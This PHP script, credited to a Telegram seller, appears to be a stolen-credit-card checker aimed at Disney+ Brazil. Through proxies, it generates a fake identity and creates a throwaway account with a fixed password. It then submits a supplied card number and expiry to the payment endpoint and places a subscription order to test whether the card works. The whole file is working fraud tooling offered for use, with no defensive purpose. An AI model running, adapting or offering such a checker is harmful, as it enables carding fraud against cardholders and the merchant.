<?php

  //////////////  //////////////
  /// PRINCIPAIS CONFIG API  ///
  /////////////  //////////////

  error_reporting(0);
  session_start();

  //////////////  /////
  ///   FUNCTIONS   ///
  /////////////  /////

function multiexplode($delimiters, $string) {
 $one = str_replace($delimiters, $delimiters[0], $string);
 $two = explode($delimiters[0], $one);
 return $two;
}
function getStr($string, $start, $end) {
  $str = explode($start, $string);
  $str = explode($end, $str[1]);  
  return $str[0];
}
function replace_unicode_escape_sequence($match) { return mb_convert_encoding(pack('H*', $match[1]), 'UTF-8', 'UCS-2BE'); }
function unicode_decode($str) { return preg_replace_callback('/\\\\u([0-9a-f]{4})/i', 'replace_unicode_escape_sequence', $str); }

DeletarCookies();
  if ($_SERVER['REQUEST_METHOD'] == "POST") {
    extract($_POST);
  } elseif ($_SERVER['REQUEST_METHOD'] == "GET") {
    extract($_GET);
  }
  
  //////////////  /////
  /// Delimitador ///
  /////////////  /////
  
  function deletarCookies() {
    if (file_exists("neocokie.txt")) {
      unlink("neocokie.txt");
    }
  }

$delemitador = array("|", ";", ":", "/", "»", "«", ">", "<");

$lista = $_GET['lista'];

  //////////////  //////////////
  /// API GERADOR DE DADOS  ///
  /////////////  //////////////

$ch = curl_init();
  curl_setopt($ch, CURLOPT_URL, "https://www.4devs.com.br/ferramentas_online.php");
  curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
  curl_setopt($ch, CURLOPT_PROXY, $ip); 
  curl_setopt($ch, CURLOPT_PROXYUSERPWD, $pwd);
  curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
  curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
  curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd()."/cookies.txt");
  curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd()."/cookies.txt");
  curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
  curl_setopt($ch, CURLOPT_HTTPHEADER, array(
    'Host: www.4devs.com.br',
    'Accept: */*',
    'Sec-Fetch-Dest: empty',
    'Content-Type: application/x-www-form-urlencoded',
    'origin: https://www.4devs.com.br',
    'Sec-Fetch-Site: same-origin',
    'Sec-Fetch-Mode: cors',
    'referer: https://www.4devs.com.br/gerador_de_pessoas'));
  curl_setopt($ch, CURLOPT_POST, 1);
  curl_setopt($ch, CURLOPT_POSTFIELDS, 'acao=gerar_pessoa&sexo=I&pontuacao=S&idade=0&cep_estado=&txt_qtde=1&cep_cidade=');
  $end = curl_exec($ch);  
  $nome = getStr($end, '"nome":"','"');


////////////////////////////////////////////////////////////////////////////////////////////////////////////////
////                                                                                                        ////
//// API FEITA E DESENVOLVIDA POR t.me/neocode                                                              ////
//// lembrese de usar proxy, e tambem trocar o jwt refresh token disponivel quando for criar a conta        ////       
////                                                                                                        ////
//// ( precisando de checker de gg? chame t.me/neocode )                                                    ////
////                                                                                                        ////
////////////////////////////////////////////////////////////////////////////////////////////////////////////////

$refresh_token = ""; // INSIRA AQUI O REFRESH TOKEN!


$ip = ""; //Ip proxy aqui
$pwd = ""; // PassWord & User aqui.

$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, "https://www.disneyplus.com/pt-br/sign-up?type=bundle");
curl_setopt($ch, CURLOPT_HEADER, 0);
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($ch, CURLOPT_PROXY, $ip); 
curl_setopt($ch, CURLOPT_PROXYUSERPWD, $pwd);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd().'/neocokie.txt');
curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd().'/neocokie.txt');
curl_setopt($ch, CURLOPT_HTTPHEADER, array(
'Host: www.disneyplus.com',
'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36'));
$wr = curl_exec($ch);

$cliente_key_api = GetStr($wr, '"clientApiKey":"','"');

$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, "https://disney.api.edge.bamgrid.com/graph/v1/device/graphql");
curl_setopt($ch, CURLOPT_HEADER, 0);
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($ch, CURLOPT_PROXY, $ip); 
curl_setopt($ch, CURLOPT_PROXYUSERPWD, $pwd);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd().'/neocokie.txt');
curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd().'/neocokie.txt');
curl_setopt($ch, CURLOPT_HTTPHEADER, array(
'Content-Type: application/json',
'Host: disney.api.edge.bamgrid.com',
'Authorization: '.$cliente_key_api.'',
'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36'));
curl_setopt($ch, CURLOPT_POSTFIELDS, '{"query":"mutation refreshToken($input:RefreshTokenInput!){refreshToken(refreshToken:$input){activeSession{sessionId}}}","variables":{"input":{"refreshToken":"'.$refresh_token.'"}},"operationName":"refreshToken"}'); 
$wr = curl_exec($ch);

$accessToken = GetStr($wr, '"accessToken":"','"');

$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, "https://disney.api.edge.bamgrid.com/v1/public/graphql");
curl_setopt($ch, CURLOPT_HEADER, 0);
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($ch, CURLOPT_PROXY, $ip); 
curl_setopt($ch, CURLOPT_PROXYUSERPWD, $pwd);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd().'/neocokie.txt');
curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd().'/neocokie.txt');
curl_setopt($ch, CURLOPT_HTTPHEADER, array(
'Content-Type: application/json',
'Authorization: '.$accessToken.'',
'Host: disney.api.edge.bamgrid.com',
'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36'));
curl_setopt($ch, CURLOPT_POSTFIELDS, '{"query":"\n    mutation register($input: RegistrationInput!) {\n        register(registration: $input) {\n            account {\n                ...account\n                attributes {\n                    email\n                }\n                id\n                activeProfile {\n                    ...profile\n                }\n                profiles {\n                    ...profile\n                }\n            }\n            activeSession {\n                ...session\n            }\n            identity {\n                ...identity\n            }\n            actionGrant\n        }\n    }\n\n    \nfragment identity on Identity {\n    attributes {\n        securityFlagged\n        createdAt\n        passwordResetRequired\n    }\n    flows {\n        marketingPreferences {\n            eligibleForOnboarding\n            isOnboarded\n        }\n        personalInfo {\n            eligibleForCollection\n            requiresCollection\n        }\n    }\n    personalInfo {\n        dateOfBirth\n        gender\n    }\n    subscriber {\n        subscriberStatus\n        subscriptionAtRisk\n        overlappingSubscription\n        doubleBilled\n        doubleBilledProviders\n        subscriptions {\n            id\n            groupId\n            state\n            partner\n            isEntitled\n            source {\n                sourceType\n                sourceProvider\n                sourceRef\n                subType\n            }\n            paymentProvider\n            product {\n                id\n                sku\n                offerId\n                promotionId\n                name\n                nextPhase {\n                    sku\n                    offerId\n                    campaignCode\n                    voucherCode\n                }\n                entitlements {\n                    id\n                    name\n                    desc\n                    partner\n                }\n                categoryCodes\n                redeemed {\n                    campaignCode\n                    redemptionCode\n                    voucherCode\n                }\n                bundle\n                bundleType\n                subscriptionPeriod\n                earlyAccess\n                trial {\n                    duration\n                }\n            }\n            term {\n                purchaseDate\n                startDate\n                expiryDate\n                nextRenewalDate\n                pausedDate\n                churnedDate\n                isFreeTrial\n            }\n            externalSubscriptionId,\n            cancellation {\n                type\n                restartEligible\n            }\n            stacking {\n                status\n                overlappingSubscriptionProviders\n                previouslyStacked\n                previouslyStackedByProvider\n            }\n        }\n    }\n}\n\n    \nfragment account on Account {\n    id\n    attributes {\n        blocks {\n            expiry\n            reason\n        }\n        consentPreferences {\n            dataElements {\n                name\n                value\n            }\n            purposes {\n                consentDate\n                firstTransactionDate\n                id\n                lastTransactionCollectionPointId\n                lastTransactionCollectionPointVersion\n                lastTransactionDate\n                name\n                status\n                totalTransactionCount\n                version\n            }\n        }\n        dssIdentityCreatedAt\n        email\n        emailVerified\n        lastSecurityFlaggedAt\n        locations {\n            manual {\n                country\n            }\n            purchase {\n                country\n                source\n            }\n            registration {\n                geoIp {\n                    country\n                }\n            }\n        }\n        securityFlagged\n        tags\n        taxId\n        userVerified\n    }\n    parentalControls {\n        isProfileCreationProtected\n    }\n    flows {\n        star {\n            isOnboarded\n        }\n    }\n}\n\n    \nfragment profile on Profile {\n    id\n    name\n    isAge21Verified\n    attributes {\n        avatar {\n            id\n            userSelected\n        }\n        isDefault\n        kidsModeEnabled\n        languagePreferences {\n            appLanguage\n            playbackLanguage\n            preferAudioDescription\n            preferSDH\n            subtitleAppearance {\n                backgroundColor\n                backgroundOpacity\n                description\n                font\n                size\n                textColor\n            }\n            subtitleLanguage\n            subtitlesEnabled\n        }\n        groupWatch {\n            enabled\n        }\n        parentalControls {\n            kidProofExitEnabled\n            isPinProtected\n        }\n        playbackSettings {\n            autoplay\n            backgroundVideo\n            prefer133\n            preferImaxEnhancedVersion\n            previewAudioOnHome\n            previewVideoOnHome\n        }\n    }\n    personalInfo {\n        dateOfBirth\n        gender\n        age\n    }\n    maturityRating {\n        ...maturityRating\n    }\n    personalInfo {\n        dateOfBirth\n        age\n        gender\n    }\n    flows {\n        personalInfo {\n            eligibleForCollection\n            requiresCollection\n        }\n        star {\n            eligibleForOnboarding\n            isOnboarded\n        }\n    }\n}\n\n\nfragment maturityRating on MaturityRating {\n    ratingSystem\n    ratingSystemValues\n    contentMaturityRating\n    maxRatingSystemValue\n    isMaxContentMaturityRating\n}\n\n\n    \nfragment session on Session {\n    device {\n        id\n        platform\n    }\n    entitlements\n    features {\n        coPlay\n    }\n    inSupportedLocation\n    isSubscriber\n    location {\n        type\n        countryCode\n        dma\n        asn\n        regionName\n        connectionType\n        zipCode\n    }\n    sessionId\n    experiments {\n        featureId\n        variantId\n        version\n    }\n    identity {\n        id\n    }\n    account {\n        id\n    }\n    profile {\n        id\n        parentalControls {\n            liveAndUnratedContent {\n                enabled\n            }\n        }\n    }\n    partnerName\n    preferredMaturityRating {\n        impliedMaturityRating\n        ratingSystem\n    }\n    homeLocation {\n        countryCode\n    }\n    portabilityLocation {\n        countryCode\n        type\n    }\n}\n\n","variables":{"input":{"attributes":{"languagePreferences":{"appLanguage":"pt-BR","playbackLanguage":"pt-BR","subtitleLanguage":"pt-BR"},"legalAssertions":["dplus-br_ppv2_proxy","dplus-br_sub_proxy"]},"email":"'.$email.'","password":"@isaac12A","profileName":"Meu Perfil"}},"operationName":"register"}'); 
$wr = curl_exec($ch);

$accessToken_Account = GetStr($wr, '"accessToken":"','"');

$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, "https://waf-elb-default-prod-bamtech.us-east-1.bamgrid.com/tokens/sps");
curl_setopt($ch, CURLOPT_HEADER, 0);
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($ch, CURLOPT_PROXY, $ip); 
curl_setopt($ch, CURLOPT_PROXYUSERPWD, $pwd);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd().'/neocokie.txt');
curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd().'/neocokie.txt');
curl_setopt($ch, CURLOPT_HTTPHEADER, array(
'Content-Type: application/json',
'Authorization: '.$accessToken_Account.'',
'Host: waf-elb-default-prod-bamtech.us-east-1.bamgrid.com',
'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36'));
curl_setopt($ch, CURLOPT_POSTFIELDS, '{"creditCardNumber":"'.$cc.'","namespaceId":100,"passthroughData":{"alternateName":"Disney Subscription Card","billingAddress":{"country":"BR"},"cardTypeOverride":"CREDIT","expiryMonth":'.$mes.',"expiryYear":'.$ano.',"isDefault":true,"isReusable":true,"isShared":false,"ownerFullName":"'.$nome.'","usage":"multi_use"}}'); 
$wr = curl_exec($ch);

$paymentMethodId = GetStr($wr, '"paymentMethodId":"','"');

$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, "https://disney.api.edge.bamgrid.com/v2/order");
curl_setopt($ch, CURLOPT_HEADER, 0);
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($ch, CURLOPT_PROXY, $ip); 
curl_setopt($ch, CURLOPT_PROXYUSERPWD, $pwd);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd().'/neocokie.txt');
curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd().'/neocokie.txt');
curl_setopt($ch, CURLOPT_HTTPHEADER, array(
'Content-Type: application/json',
'Authorization: '.$accessToken_Account.'',
'Host: disney.api.edge.bamgrid.com',
'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36'));
curl_setopt($ch, CURLOPT_POSTFIELDS, '{"lineItems":[{"sku":"disney_plus_combo_plus_monthly_br_web_web_8258eb0"}],"paymentMethodId":"'.$paymentMethodId.'","orderCampaigns":[{"campaignCode":"STAR_BUNDLE_CMPGN","voucherCode":"STAR_BUNDLE_VOCHR"}],"offerId":"3b60d745-ce64-4de4-adbf-2ce27f80afb6"}'); 
echo $wr = curl_exec($ch);

$guid = GetStr($wr, '"guid":"','"');

$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, "https://disney.api.edge.bamgrid.com/v2/orders/$guid");
curl_setopt($ch, CURLOPT_HEADER, 0);
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($ch, CURLOPT_PROXY, $ip); 
curl_setopt($ch, CURLOPT_PROXYUSERPWD, $pwd);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd().'/neocokie.txt');
curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd().'/neocokie.txt');
curl_setopt($ch, CURLOPT_HTTPHEADER, array(
'Content-Type: application/json',
'Authorization: '.$accessToken_Account.'',
'Host: disney.api.edge.bamgrid.com',
'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36'));
echo $wr = curl_exec($ch);

?>